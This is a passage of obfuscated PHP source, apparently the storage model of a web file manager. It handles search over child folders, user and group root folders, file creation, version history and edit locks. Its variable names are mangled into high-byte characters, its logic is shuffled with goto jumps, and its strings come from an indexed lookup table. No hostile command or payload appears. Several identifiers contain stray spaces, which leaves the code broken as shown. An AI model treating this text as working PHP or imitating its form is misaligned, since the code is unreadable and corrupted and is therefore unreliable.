$EåƒÇåŸùå[$CŸï²ÎØÓ›[456]] . $CŸï²ÎØÓ›[47]; if (stripos($få¹ë‘”ñ[$CŸï²ÎØÓ›[454]], $aÜê¹Ö¡°Ù) !== !1) { $e‚­‹¸ˆ¬Ã[] = $få¹ë‘”ñ; } } $b¶Â¢Şœ¢à[$CŸï²ÎØÓ›[350]] = array_merge($e‚­‹¸ˆ¬Ã, $b¶Â¢Şœ¢à[$CŸï²ÎØÓ›[350]]); $b¶Â¢Şœ¢à[$CŸï²ÎØÓ›[347]][$CŸï²ÎØÓ›[348]] += count($e‚­‹¸ˆ¬Ã); goto E¶Ä÷æêß; F‚¼æ®ÌÁ: $BœÅì‡‚†¹ = $this->field($cäñ¥†©)->where($Cø™Ú…‚¨Ï)->select(); if (!$BœÅì‡‚†¹) { return; } $e‚­‹¸ˆ¬Ã = array(); goto fèí¤Ë¿¼; E¶Ä÷æêß: } public function listSearchChildren($b”¶Û²‰‡ò, $EšÌÔ¤£¬ = 5000) { goto e¦ªØÅ¶‰; eó‰‚¤ÂøŸ: $Aœ•ïî®ÒÚ = array($b¡‡ìŸÖ Ï[454] => array($b¡‡ìŸÖ Ï[734], $E°†¤°ğé[$b¡‡ìŸÖ Ï[454]] . $E°†¤°ğé[$b¡‡ìŸÖ Ï[365]] . $b¡‡ìŸÖ Ï[475])); $AáÛôœ‚Æô = $this->field($b¡‡ìŸÖ Ï[365])->cache(null, 600)->where($Aœ•ïî®ÒÚ)->count(); if ($AáÛôœ‚Æô > $EšÌÔ¤£¬) { return $this->_listSearchChildrenNear($b”¶Û²‰‡ò, $EšÌÔ¤£¬); } goto AŠåªÊå; e¦ªØÅ¶‰: $b¡‡ìŸÖ Ï =& $_SERVER[‘®…¢À]; $B“ÑÈ¸¬ì = array(); $E°†¤°ğé = $this->sourceInfo($b”¶Û²‰‡ò); goto eó‰‚¤ÂøŸ; AŠåªÊå: $a®°ºãÊÀ = $this->field($b¡‡ìŸÖ Ï[365])->where($Aœ•ïî®ÒÚ)->select(); $B“ÑÈ¸¬ì = array_to_keyvalue($a®°ºãÊÀ, $b¡‡ìŸÖ Ï[33], $b¡‡ìŸÖ Ï[365]); return $B“ÑÈ¸¬ì; goto CÃŸìàö; CÃŸìàö: } private function _listSearchChildrenNear($b¯ƒö¸—Ş, $aÃáºœÙÌÎ) { goto f«ØåÃ†—Ó; A™ã¯Ãò¾‹: $fè³¶¾É¯Í = $this->field($D»éÉ¥¡è„[2201])->where($e×’¢©Õóó)->select(); $f·“£Îâ = array_to_keyvalue(array_filter_by_field($fè³¶¾É¯Í, $D»éÉ¥¡è„[366], $D»éÉ¥¡è„[84]), $D»éÉ¥¡è„[33], $D»éÉ¥¡è„[365]); $Bµé“Ô‰…ö = array_merge($Bµé“Ô‰…ö, array_to_keyvalue($fè³¶¾É¯Í, $D»éÉ¥¡è„[33], $D»éÉ¥¡è„[365])); goto B ¢´†Ü³; f«ØåÃ†—Ó: $D»éÉ¥¡è„ =& $_SERVER[‘®…¢À]; $Bµé“Ô‰…ö = array(); $e×’¢©Õóó = array($D»éÉ¥¡è„[456] => $b¯ƒö¸—Ş); goto A™ã¯Ãò¾‹; Dâ¯ÀõÎ‚°: $Bµé“Ô‰…ö = array_merge($Bµé“Ô‰…ö, array_to_keyvalue($fè³¶¾É¯Í, $D»éÉ¥¡è„[33], $D»éÉ¥¡è„[365])); $Bµé“Ô‰…ö = array_slice($Bµé“Ô‰…ö, 0, $aÃáºœÙÌÎ); return $Bµé“Ô‰…ö; goto FŸ«ºß¿¥Æ; B ¢´†Ü³: if (!$f·“£Îâ) { return $Bµé“Ô‰…ö; } $e×’¢©Õóó = array($D»éÉ¥¡è„[456] => array($D»éÉ¥¡è„[7], $f·“£Îâ)); $fè³¶¾É¯Í = $this->field($D»éÉ¥¡è„[2201])->where($e×’¢©Õóó)->select(); goto Dâ¯ÀõÎ‚°; FŸ«ºß¿¥Æ: } private function _listSearchBindPinyin($f×Õì§™±, &$DäªË¿ÜÍà, &$AÆ†‡ƒöô) { goto e˜Â–õ‡; d’‡ÂØ¢: $EÚ­Èã¹ç• = array(); $AÆ†‡ƒöô = str_replace(array($cÊÙëŠôÖ†[214], $cÊÙëŠôÖ†[50], $cÊÙëŠôÖ†[2202]), $cÊÙëŠôÖ†[33], $AÆ†‡ƒöô); $AÆ†‡ƒöô = $cÊÙëŠôÖ†[2203] . str_replace($cÊÙëŠôÖ†[47], $cÊÙëŠôÖ†[2204], $AÆ†‡ƒöô); goto F“ƒ˜¥¡; Cµ¢ºã©™: $EÚ­Èã¹ç•[] = array($cÊÙëŠôÖ†[2205] => $Aªîğ’Àáë, $cÊÙëŠôÖ†[895] => $cÊÙëŠôÖ†[2082], array($cÊÙëŠôÖ†[2206] => $Aªîğ’Àáë, $cÊÙëŠôÖ†[2207] => array($cÊÙëŠôÖ†[7], array($cÊÙëŠôÖ†[411], $cÊÙëŠôÖ†[410])))); $this->join($aÀİÍÂÜÜ); $DäªË¿ÜÍà = $EÚ­Èã¹ç•; goto eµİ½ÀˆÁå; e˜Â–õ‡: $cÊÙëŠôÖ† =& $_SERVER[‘®…¢À]; if (!Input::check($f×Õì§™±[$cÊÙëŠôÖ†[2078]], $cÊÙëŠôÖ†[303]) || strlen($f×Õì§™±[$cÊÙëŠôÖ†[2078]]) < 2) { return; } $aÀİÍÂÜÜ = "\114\105\x46\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\151\157\137\x73\157\165\x72\143\x65\137\155\145\x74\x61\40\x6d\145\164\141\x20\157\156\40\163\157\165\x72\143\x65\x2e\163\x6f\165\x72\x63\x65\111\x44\40\75\40\x6d\145\164\x61\x2e\x73\x6f\x75\x72\143\145\x49\104"; goto d’‡ÂØ¢; F“ƒ˜¥¡: unset($DäªË¿ÜÍà[$cÊÙëŠôÖ†[28]]); foreach ($DäªË¿ÜÍà as $f†‘—¤Ãß° => $dËËÀ××³´) { $EÚ­Èã¹ç•[$cÊÙëŠôÖ†[2203] . $f†‘—¤Ãß°] = $dËËÀ××³´; } $Aªîğ’Àáë = array($cÊÙëŠôÖ†[474], $cÊÙëŠôÖ†[2080] . $f×Õì§™±[$cÊÙëŠôÖ†[2078]] . $cÊÙëŠôÖ†[2080]); goto Cµ¢ºã©™; eµİ½ÀˆÁå: } private function _parseSearchWhere($f¡”ôğ¯Œ) { goto Aéöæ·‡µ÷; D§Ì‘…ˆ»ª: if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[526]])) { $bÇÚŞ¨‡…§[] = array($FÜÈ×…ÜŠÄ[375] => $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[526]], $FÜÈ×…ÜŠÄ[374] => $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[526]], $FÜÈ×…ÜŠÄ[895] => $FÜÈ×…ÜŠÄ[2082]); } if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[368]])) { $BÂà„Ğ°² = $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[368]]; if ($BÂà„Ğ°² == $FÜÈ×…ÜŠÄ[77]) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[366]] = 1; } else { if ($BÂà„Ğ°² == $FÜÈ×…ÜŠÄ[2213]) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[366]] = 0; } else { if ($BÂà„Ğ°²) { $BÂà„Ğ°² = is_array($BÂà„Ğ°²) ? $BÂà„Ğ°² : explode($FÜÈ×…ÜŠÄ[47], $BÂà„Ğ°²); $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[368]] = array($FÜÈ×…ÜŠÄ[380], $BÂà„Ğ°²); $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[366]] = 0; } } } } if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[456]])) { $eôàİËÚª = $this->sourceInfo($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[456]]); $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[516]] = array($FÜÈ×…ÜŠÄ[474], $eôàİËÚª[$FÜÈ×…ÜŠÄ[454]] . $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[456]] . $FÜÈ×…ÜŠÄ[475]); } goto bÂ–ºÎò; bÂ–ºÎò: if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2078]]) && $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2078]]) { $EğÉ¥½¿× = $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2078]]; $cÕôÌ„³‘ = explode($FÜÈ×…ÜŠÄ[50], $EğÉ¥½¿×); if (strlen($EğÉ¥½¿×) > 2 && (substr($EğÉ¥½¿×, 0, 1) == $FÜÈ×…ÜŠÄ[114] && substr($EğÉ¥½¿×, -1) == $FÜÈ×…ÜŠÄ[114]) || substr($EğÉ¥½¿×, 0, 1) == $FÜÈ×…ÜŠÄ[55] && substr($EğÉ¥½¿×, -1) == $FÜÈ×…ÜŠÄ[55]) { $EğÉ¥½¿× = substr($EğÉ¥½¿×, 1, -1); $cÕôÌ„³‘ = array($EğÉ¥½¿×); } $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[28]] = array($FÜÈ×…ÜŠÄ[474], $FÜÈ×…ÜŠÄ[2080] . $EğÉ¥½¿× . $FÜÈ×…ÜŠÄ[2080]); if (count($cÕôÌ„³‘) > 1) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[28]] = array(); foreach ($cÕôÌ„³‘ as $däÂçƒÍÃ) { if (!trim($däÂçƒÍÃ)) { continue; } $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[28]][] = array($FÜÈ×…ÜŠÄ[474], $FÜÈ×…ÜŠÄ[2080] . trim($däÂçƒÍÃ) . $FÜÈ×…ÜŠÄ[2080]); } } } return $bÇÚŞ¨‡…§; goto Bñ¹ô…î„’; fŒ¡–Ë–Äù: if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[676]])) { $E‘Ğáñò×é = array($FÜÈ×…ÜŠÄ[2209], $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[676]]); if ($bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[108]]) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[108]] = array($bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[108]], $E‘Ğáñò×é, $FÜÈ×…ÜŠÄ[2210]); } else { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[108]] = $E‘Ğáñò×é; } } if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2211]])) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[78]] = array($FÜÈ×…ÜŠÄ[2208], $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2211]]); } if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2212]])) { $E‘Ğáñò×é = array($FÜÈ×…ÜŠÄ[2209], $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[2212]]); if ($bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[78]]) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[78]] = array($bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[78]], $E‘Ğáñò×é, $FÜÈ×…ÜŠÄ[2210]); } else { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[78]] = $E‘Ğáñò×é; } } goto D§Ì‘…ˆ»ª; Aéöæ·‡µ÷: $FÜÈ×…ÜŠÄ =& $_SERVER[‘®…¢À]; $bÇÚŞ¨‡…§ = array(); if (isset($f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[675]])) { $bÇÚŞ¨‡…§[$FÜÈ×…ÜŠÄ[108]] = array($FÜÈ×…ÜŠÄ[2208], $f¡”ôğ¯Œ[$FÜÈ×…ÜŠÄ[675]]); } goto fŒ¡–Ë–Äù; Bñ¹ô…î„’: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($bÛ°´¼³Öƒ) { $CŒæàÇ…‚ğ =& $_SERVER[‘®…¢À]; $c‘åòô°‚É = Model($CŒæàÇ…‚ğ[465])->where(array($CŒæàÇ…‚ğ[1328] => $bÛ°´¼³Öƒ))->find(); $D£İŠ‰¤Àİ = $this->_mkdirRoot(SourceModel::TYPE_USER, $bÛ°´¼³Öƒ, $c‘åòô°‚É[$CŒæàÇ…‚ğ[28]]); $this->userDesktopAdd($D£İŠ‰¤Àİ); return $D£İŠ‰¤Àİ; } public function userDesktopAdd($d¥–¼ˆÀÇí) { $c°ß§¥¬± =& $_SERVER[‘®…¢À]; $BÂŒ‡Ã·®è = LNG($c°ß§¥¬±[2214]); $b³Ø†ê‰èÊ = $this->mkdir($d¥–¼ˆÀÇí, $BÂŒ‡Ã·®è); $this->metaSet($b³Ø†ê‰èÊ, $c°ß§¥¬±[2215], $c°ß§¥¬±[84]); $this->metaSet($d¥–¼ˆÀÇí, $c°ß§¥¬±[2216], $b³Ø†ê‰èÊ); } public function groupRootAdd($CÛçæ¦Üê) { $EÀĞº°â“ =& $_SERVER[‘®…¢À]; $ešĞ¨Ã²¶ = Model($EÀĞº°â“[453])->where(array($EÀĞº°â“[2074] => $CÛçæ¦Üê))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $CÛçæ¦Üê, $ešĞ¨Ã²¶[$EÀĞº°â“[28]]); } public function systemRootPathAdd($Bš‚Ğ¯÷³–) { if ($Bš‚Ğ¯÷³– != $_SERVER[‘®…¢À][1046]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Bš‚Ğ¯÷³–); } public function userRootRemove($A´Ïó­îİ–) { $aì·¿£îâ = $this->sourceRoot(SourceModel::TYPE_USER, $A´Ïó­îİ–); if (!$aì·¿£îâ) { return; } $this->remove($aì·¿£îâ, !1); } public function groupRootRemove($EÑ¹ÍÁ«¡ë) { $e½´…ò½”Ã = $this->sourceRoot(SourceModel::TYPE_GROUP, $EÑ¹ÍÁ«¡ë); if (!$e½´…ò½”Ã) { return; } $this->remove($e½´…ò½”Ã, !1); } private function _mkdirRoot($cÊè¸ñŠ®, $a¦²Å²·È¥, $aæÃº‡ïîâ) { goto e»×¬È¨¸î; D³öÌËéäò: CacheLock::unlock($CÕÄ’®¤Ü¡); return $c¡”˜Ìˆï©; goto Dùæ¿í´; fßå«ë«Àî: $c¡”˜Ìˆï© = $this->add($E¹Õ„È¹Ç¨); $Aà¶¬ÂÂĞ = array($BÁ÷†õÂ[518] => short_id($c¡”˜Ìˆï©)); $this->where(array($BÁ÷†õÂ[379] => $c¡”˜Ìˆï©))->save($Aà¶¬ÂÂĞ); goto D³öÌËéäò; dôë““Å©: $CÕÄ’®¤Ü¡ = "\115\157\144\145\x6c\123\157\x75\x72\x63\145\56\x6d\153\x64\x69\162\122\157\157\x74\56{$cÊè¸ñŠ®}\56{$a¦²Å²·È¥}\56" . $aæÃº‡ïîâ; CacheLock::lock($CÕÄ’®¤Ü¡); $E¹Õ„È¹Ç¨[$BÁ÷†õÂ[28]] = $aæÃº‡ïîâ; goto fßå«ë«Àî; e»×¬È¨¸î: $BÁ÷†õÂ =& $_SERVER[‘®…¢À]; $E¹Õ„È¹Ç¨ = array($BÁ÷†õÂ[364] => 0, $BÁ÷†õÂ[512] => $cÊè¸ñŠ®, $BÁ÷†õÂ[513] => $a¦²Å²·È¥, $BÁ÷†õÂ[509] => 1, $BÁ÷†õÂ[514] => USER_ID, $BÁ÷†õÂ[515] => USER_ID, $BÁ÷†õÂ[510] => $BÁ÷†õÂ[33], $BÁ÷†õÂ[516] => $BÁ÷†õÂ[2071], $BÁ÷†õÂ[391] => 0, $BÁ÷†õÂ[511] => 0, $BÁ÷†õÂ[415] => 0, $BÁ÷†õÂ[517] => $BÁ÷†õÂ[33]); if ($EÖÚ¹–Ñ§ó = $this->where($E¹Õ„È¹Ç¨)->find()) { return $EÖÚ¹–Ñ§ó[$BÁ÷†õÂ[365]]; } goto dôë““Å©; Dùæ¿í´: } private function sourceRoot($eèåÎÅ¸², $EÓ¿ÕÉ æ—, $fƒêñ¯ô¾È = false) { $AŒĞí£¨¤” =& $_SERVER[‘®…¢À]; $f§áßÀ¦Ó² = array($AŒĞí£¨¤”[364] => 0, $AŒĞí£¨¤”[512] => $eèåÎÅ¸², $AŒĞí£¨¤”[513] => $EÓ¿ÕÉ æ—); if ($d†áË¿Ÿ¶ = $this->where($f§áßÀ¦Ó²)->find()) { return $fƒêñ¯ô¾È ? $d†áË¿Ÿ¶ : $d†áË¿Ÿ¶[$AŒĞí£¨¤”[365]]; } return !1; } public function sourceRootGroup($F¬ÎÅ§Ú¼«) { $Dà¨‹»Àåœ =& $_SERVER[‘®…¢À]; if (is_string($F¬ÎÅ§Ú¼«)) { $F¬ÎÅ§Ú¼« = array($F¬ÎÅ§Ú¼«); } $cÔ½ööéï¶ = array($Dà¨‹»Àåœ[364] => 0, $Dà¨‹»Àåœ[512] => SourceModel::TYPE_GROUP, $Dà¨‹»Àåœ[513] => array($Dà¨‹»Àåœ[7], $F¬ÎÅ§Ú¼«)); $aˆõƒôÔÏ = $this->listSource($cÔ½ööéï¶, 1000); return array_to_keyvalue($aˆõƒôÔÏ[$Dà¨‹»Àåœ[75]], $Dà¨‹»Àåœ[451]); } public function mkfile($fÂ²õ§ÕŒ, $E¿Ëİ†ÏÎ, $c¬õ‘¸‚¹ = '', $d¶‘äˆÆèè = REPEAT_RENAME) { $aÜĞÔ®öÀ =& $_SERVER[‘®…¢À]; $Fæ‘ÎÇõ·Ø = Model($aÜĞÔ®öÀ[535])->addFileByContent($c¬õ‘¸‚¹, $E¿Ëİ†ÏÎ); return $this->_createFileCall($fÂ²õ§ÕŒ, $E¿Ëİ†ÏÎ, $Fæ‘ÎÇõ·Ø, $d¶‘äˆÆèè, $aÜĞÔ®öÀ[1077]); } public function addFile($c†ò£‚Šéø, $fªÌÙšˆçÔ, $f…áÅõõ‚ô, $d¿ØÏ§Š = false, $bÅ‡†„¨ïá = REPEAT_RENAME) { $aå¥ÃºÓ÷ = Model($_SERVER[‘®…¢À][535])->addFile($fªÌÙšˆçÔ, $f…áÅõõ‚ô, $d¿ØÏ§Š); return $this->_createFileCall($c†ò£‚Šéø, $f…áÅõõ‚ô, $aå¥ÃºÓ÷, $bÅ‡†„¨ïá); } public function addFileByFileID($B˜ßƒ â­Ÿ, $DÛæÆáå¦‡, $a‘‹—İÉ´ç, $E—íÊ±¦ = REPEAT_RENAME) { $CªÃ¶¨Á¤ø =& $_SERVER[‘®…¢À]; $F™º­ÁòòÌ = Model($CªÃ¶¨Á¤ø[535])->find($DÛæÆáå¦‡); Model($CªÃ¶¨Á¤ø[535])->linkAdd($DÛæÆáå¦‡); return $this->_createFileCall($B˜ßƒ â­Ÿ, $a‘‹—İÉ´ç, $F™º­ÁòòÌ, $E—íÊ±¦); } public function addFileByRemote($Eñº¡ğ‚Ãë, $BËƒ‹“øÓğ, $c‡×ƒÕ‹¯, $DÍ‘¿µ…¨ = array(), $Eã¨´ƒ­Ì = REPEAT_RENAME) { $d×¼Õ®ˆ–Ü = Model($_SERVER[‘®…¢À][535])->addFileByRemote($BËƒ‹“øÓğ, $c‡×ƒÕ‹¯, $DÍ‘¿µ…¨); return $this->_createFileCall($Eñº¡ğ‚Ãë, $c‡×ƒÕ‹¯, $d×¼Õ®ˆ–Ü, $Eã¨´ƒ­Ì); } private function _createFileCall($b¨Ñ×Áª , $fŒ¯‡¬ëñ, $b°¨æ×Éöõ, $bŠÆ°µÌ‹¿, $B®†Ôï× = "\165\x70\154\157\141\144") { goto dé¹Üµİ÷õ; dé¹Üµİ÷õ: $DÚõ¸¨ä =& $_SERVER[‘®…¢À]; $e…Ãì®Ï› = !1; $this->lockWriteStart($b¨Ñ×Áª , $fŒ¯‡¬ëñ); goto F—Í¶£·‡ª; DØ¯öÜšÙ¾: $this->lockWriteEnd($b¨Ñ×Áª , $fŒ¯‡¬ëñ); return $f‘ ÷øİö‹; goto fƒáº¸ï…´; F—Í¶£·‡ª: $f‘ ÷øİö‹ = $this->_createFile($b¨Ñ×Áª , $fŒ¯‡¬ëñ, $b°¨æ×Éöõ, $bŠÆ°µÌ‹¿, $e…Ãì®Ï›); if ($f‘ ÷øİö‹) { Model($DÚõ¸¨ä[2186])->eventCreate($f‘ ÷øİö‹, $B®†Ôï×); } if (!$e…Ãì®Ï›) { Model($DÚõ¸¨ä[417])->remove($b°¨æ×Éöõ[$DÚõ¸¨ä[414]]); } goto DØ¯öÜšÙ¾; fƒáº¸ï…´: } public function mkdir($a£Ñ „…Ã¶, $cÓÀÇ‰³², $bå¾ÁÁææ = REPEAT_SKIP) { goto f¾ÇÆŸÎ›; bƒ³³Ûƒìµ: return $BÊºâìš½…; goto CìŸ«‹…½²; Cˆ â®£Ù: $BÊºâìš½… = $this->_addSoure($BÆÍ†ó¯İ©, $eò‡Ëò…Ü); Model($DØ–¯æÙ”¥[2186])->eventCreate($BÊºâìš½…, $DØ–¯æÙ”¥[1078]); $this->lockWriteEnd($a£Ñ „…Ã¶, $cÓÀÇ‰³²); goto bƒ³³Ûƒìµ; dÎ†Ö™Ú¯Š: $this->lockWriteStart($a£Ñ „…Ã¶, $cÓÀÇ‰³²); if ($bå¾ÁÁææ !== !1) { $c¾¼„”÷£  = $this->fileNameExist($a£Ñ „…Ã¶, $cÓÀÇ‰³²); if ($c¾¼„”÷£  && $bå¾ÁÁææ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($a£Ñ „…Ã¶, $cÓÀÇ‰³²); return $c¾¼„”÷£ ; } $cÓÀÇ‰³² = $this->fileNameAuto($a£Ñ „…Ã¶, $cÓÀÇ‰³², $bå¾ÁÁææ); } $BÆÍ†ó¯İ© = array($DØ–¯æÙ”¥[509] => 1, $DØ–¯æÙ”¥[382] => $cÓÀÇ‰³², $DØ–¯æÙ”¥[510] => $DØ–¯æÙ”¥[33], $DØ–¯æÙ”¥[415] => 0, $DØ–¯æÙ”¥[511] => 0); goto Cˆ â®£Ù; f¾ÇÆŸÎ›: $DØ–¯æÙ”¥ =& $_SERVER[‘®…¢À]; $eò‡Ëò…Ü = $this->sourceInfo($a£Ñ „…Ã¶); if (!$eò‡Ëò…Ü) { return !1; } goto dÎ†Ö™Ú¯Š; CìŸ«‹…½²: } private function _createFile($dÊÕöÖƒ•î, $F¾ß˜¸„Ëš, $c¶ÙØÅ‰µ, $BòãßôãÑ…, &$B¿ˆá«”¶) { goto aÖ²®Ï½–•; EÓ¯“Ù¾Š: $a–¬…†Ë‡ = array($F²Ã¶ïØ·š[509] => 0, $F²Ã¶ïØ·š[382] => $F¾ß˜¸„Ëš, $F²Ã¶ïØ·š[510] => get_path_ext($F¾ß˜¸„Ëš), $F²Ã¶ïØ·š[415] => $c¶ÙØÅ‰µ[$F²Ã¶ïØ·š[414]], $F²Ã¶ïØ·š[511] => $c¶ÙØÅ‰µ[$F²Ã¶ïØ·š[78]]); $C–š©„©ÃÛ = $this->_addSoure($a–¬…†Ë‡, $A¦é¤‹áÜç); $this->folderSizeReset($dÊÕöÖƒ•î); goto eåí¶Ö±; aÖ²®Ï½–•: $F²Ã¶ïØ·š =& $_SERVER[‘®…¢À]; $A¦é¤‹áÜç = $this->sourceInfo($dÊÕöÖƒ•î); if (!$c¶ÙØÅ‰µ || !$A¦é¤‹áÜç) { return !1; } goto f‹Ìâæ¼»Ä; f‹Ìâæ¼»Ä: if ($BòãßôãÑ… !== !1) { $Eâ—ÊÀÅ‹ = $this->fileNameExist($dÊÕöÖƒ•î, $F¾ß˜¸„Ëš); } $B¿ˆá«”¶ = !0; if ($BòãßôãÑ… && $Eâ—ÊÀÅ‹) { if ($BòãßôãÑ… == REPEAT_SKIP) { $B¿ˆá«”¶ = !1; return $Eâ—ÊÀÅ‹; } else { if ($BòãßôãÑ… == REPEAT_REPLACE) { $DÑÃõ£è = $this->sourceInfo($Eâ—ÊÀÅ‹); $bİôĞÌÙˆ = $this->fileHistory($DÑÃõ£è, $c¶ÙØÅ‰µ[$F²Ã¶ïØ·š[414]], $c¶ÙØÅ‰µ[$F²Ã¶ïØ·š[78]]); if (!$bİôĞÌÙˆ) { $B¿ˆá«”¶ = !1; } else { $this->folderSizeReset($dÊÕöÖƒ•î); } return $Eâ—ÊÀÅ‹; } else { $F¾ß˜¸„Ëš = $this->fileNameAuto($dÊÕöÖƒ•î, $F¾ß˜¸„Ëš, $BòãßôãÑ…, !1); } } } goto EÓ¯“Ù¾Š; eåí¶Ö±: return $C–š©„©ÃÛ; goto D÷Ë¶É†·Ä; D÷Ë¶É†·Ä: } protected function fileHistory($F•á˜Ö»İ, $fÂºêĞ„Ì, $f•ÓÒÁÕ„„) { goto aö¬™èøºš; aö¬™èøºš: $b‚ŠÏ›»‘ =& $_SERVER[‘®…¢À]; if ($F•á˜Ö»İ[$b‚ŠÏ›»‘[414]] == $fÂºêĞ„Ì) { return !1; } $this->checkLock($F•á˜Ö»İ[$b‚ŠÏ›»‘[365]]); goto aÅĞ¢…š©‘; aªáÕâšÄ‘: return !0; goto A¤éœæ¾ƒë; aÅĞ¢…š©‘: Model($b‚ŠÏ›»‘[2217])->addHistory($F•á˜Ö»İ); $a—©Õ÷§Õ = array($b‚ŠÏ›»‘[515] => USER_ID, $b‚ŠÏ›»‘[386] => time(), $b‚ŠÏ›»‘[414] => $fÂºêĞ„Ì, $b‚ŠÏ›»‘[78] => $f•ÓÒÁÕ„„); $this->where(array($b‚ŠÏ›»‘[379] => $F•á˜Ö»İ[$b‚ŠÏ›»‘[365]]))->save($a—©Õ÷§Õ); goto aªáÕâšÄ‘; A¤éœæ¾ƒë: } public function checkLock($A¥áÆ­›…°) { $eŠ‚È»ï =& $_SERVER[‘®…¢À]; $Dô®÷í»Á· = $this->pathInfo($A¥áÆ­›…°); if (!$this->fileIsLock($Dô®÷í»Á·, !0)) { return; } $BâçªÕì¤ = $Dô®÷í»Á·[$eŠ‚È»ï[412]][$eŠ‚È»ï[472]]; $aÛ‚µ¼¿³Ê = $BâçªÕì¤[$eŠ‚È»ï[2218]] ? $BâçªÕì¤[$eŠ‚È»ï[2218]] : $BâçªÕì¤[$eŠ‚È»ï[28]]; show_json(LNG($eŠ‚È»ï[2219]) . $eŠ‚È»ï[2220] . LNG($eŠ‚È»ï[2221]) . $eŠ‚È»ï[2222] . $aÛ‚µ¼¿³Ê . $eŠ‚È»ï[2223], !1); } public function fileIsLock($b©¬À‡ˆ, $E˜³ºÕ˜«Ú = false) { goto B»Çä™ÔÅ­; C”ôÜ‰óêÌ: return !1; goto Eáòè ¥ç‘; B»Çä™ÔÅ­: $d…ˆ×Í­â¢ =& $_SERVER[‘®…¢À]; if (!isset($b©¬À‡ˆ[$d…ˆ×Í­â¢[412]]) || !$b©¬À‡ˆ[$d…ˆ×Í­â¢[412]][$d…ˆ×Í­â¢[469]]) { return !1; } if ($b©¬À‡ˆ[$d…ˆ×Í­â¢[412]][$d…ˆ×Í­â¢[469]] != USER_ID) { return !0; } goto AŒï¥Ä×‹à; AŒï¥Ä×‹à: $c½·ˆ˜æ— = $GLOBALS[$d…ˆ×Í­â¢[6]][$d…ˆ×Í­â¢[85]][$d…ˆ×Í­â¢[470]]; if ($b©¬À‡ˆ[$d…ˆ×Í­â¢[412]][$d…ˆ×Í­â¢[471]] <= time() - $c½·ˆ˜æ—) { $this->metaSet($b©¬À‡ˆ[$d…ˆ×Í­â¢[365]], $d…ˆ×Í­â¢[469], null); $this->metaSet($b©¬À‡ˆ[$d…ˆ×Í­â¢[365]], $d…ˆ×Í­â¢[471], null); } if ($E˜³ºÕ˜«Ú) { $this->metaSet($b©¬À‡ˆ[$d…ˆ×Í­â¢[365]], $d…ˆ×Í­â¢[471], time()); } goto C”ôÜ‰óêÌ; Eáòè ¥ç‘: } private function _addSoure($cšŒ‚Î‹ÁÏ, $A‚¡ÒíºÅ) { goto BÜŒÓŒí…È; cØÆÍÈ›×: $this->updateModifyTime($cšŒ‚Î‹ÁÏ[$b÷¿ÄÒæ‰¦[456]]); static $bÌ¾ˆôñŸÉ = false; if (!$bÌ¾ˆôñŸÉ) { Hook::trigger($b÷¿ÄÒæ‰¦[499], $cšŒ‚Î‹ÁÏ); $bÌ¾ˆôñŸÉ = !0; } goto aëŸ‘ù•Í; FœÅ·Ù¯‡: $this->setNamePinyin($cÒÆŠïÊƒ, $cšŒ‚Î‹ÁÏ[$b÷¿ÄÒæ‰¦[28]]); return $cÒÆŠïÊƒ; goto f¯ğ·£×; BÜŒÓŒí…È: $b÷¿ÄÒæ‰¦ =& $_SERVER[‘®…¢À]; $eç¡óÌá = array($b÷¿ÄÒæ‰¦[512] => $A‚¡ÒíºÅ[$b÷¿ÄÒæ‰¦[367]], $b÷¿ÄÒæ‰¦[513] => $A‚¡ÒíºÅ[$b÷¿ÄÒæ‰¦[451]], $b÷¿ÄÒæ‰¦[514] => USER_ID, $b÷¿ÄÒæ‰¦[515] => USER_ID, $b÷¿ÄÒæ‰¦[364] => $A‚¡ÒíºÅ[$b÷¿ÄÒæ‰¦[365]], $b÷¿ÄÒæ‰¦[516] => $A‚¡ÒíºÅ[$b÷¿ÄÒæ‰¦[454]] . $A‚¡ÒíºÅ[$b÷¿ÄÒæ‰¦[365]] . $b÷¿ÄÒæ‰¦[47], $b÷¿ÄÒæ‰¦[391] => 0, $b÷¿ÄÒæ‰¦[517] => $b÷¿ÄÒæ‰¦[33]); $cšŒ‚Î‹ÁÏ = array_merge($eç¡óÌá, 